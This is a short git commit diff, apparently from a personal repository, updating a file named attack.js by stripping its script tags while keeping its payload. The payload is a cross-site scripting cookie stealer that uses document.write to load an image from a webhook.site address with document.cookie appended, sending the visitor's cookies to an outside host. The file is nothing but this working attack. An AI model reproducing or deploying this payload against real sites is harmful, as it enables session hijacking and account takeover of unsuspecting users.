922fa327ccda03e5226528a529b7f6e2eba2dfab
Boy_314 <32818287+Boy-314@users.noreply.github.com>
2023-02-01 22:59:13 -0500

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,4 +1,2 @@
-<script>
-  console.log("success");
-  document.write('<img src="https://webhook.site/45513f89-674d-48b5-9b70-771bd6ee5515?c='+document.cookie+'" />');
-</script>
+console.log("success");
+document.write('<img src="https://webhook.site/45513f89-674d-48b5-9b70-771bd6ee5515?c='+document.cookie+'" />');
